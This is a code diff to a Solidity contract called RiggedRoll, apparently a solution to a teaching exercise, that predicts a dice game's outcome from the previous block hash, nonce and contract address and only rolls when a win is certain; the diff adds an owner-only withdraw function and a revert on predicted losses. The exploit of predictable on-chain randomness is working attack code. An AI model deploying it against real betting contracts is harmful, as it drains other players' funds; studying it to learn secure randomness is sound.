@@ -17,6 +17,11 @@ contract RiggedRoll is Ownable {
     }
 
     // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
+    function withdraw(address payable _addr, uint256 _amount) public onlyOwner {
+        require(_amount <= address(this).balance, "Insufficient balance");
+        (bool sent, ) = _addr.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+    }
 
     // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
     function riggedRoll() public onlyOwner {
@@ -28,10 +33,10 @@ contract RiggedRoll is Ownable {
         bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));  // Create a unique hash
         uint256 roll = uint256(hash) % 16;  // Convert hash to a number between 0 and 15
 
-        console.log("\t", "   Previous Block Hash:", uint256(prevHash)); // To write the RiggedRoll attack contract, we need to know the previous block hash
-        console.log("\t", "   Nonce:", nonce);  // and the rest of the variables that are hashed together
-        console.log("\t", "   Contract Address:", address(diceGame));
-        console.log("\t", "   Dice Game Roll:", roll);
+        // console.log("\t", "   Previous Block Hash:", uint256(prevHash)); // To write the RiggedRoll attack contract, we need to know the previous block hash
+        // console.log("\t", "   Nonce:", nonce);  // and the rest of the variables that are hashed together
+        // console.log("\t", "   Contract Address:", address(diceGame));
+        // console.log("\t", "   Dice Game Roll:", roll);
 
         if (roll < 6) {
             console.log("\t", "   Predicted win, calling rollTheDice()");
@@ -40,6 +45,7 @@ contract RiggedRoll is Ownable {
         } else {
             console.log("\t", "   Predicted loss, not calling rollTheDice()");
             emit RiggedRollResult(false, roll);
+            revert("Predicted roll > 5, not calling rollTheDice()");
         }
     }
 
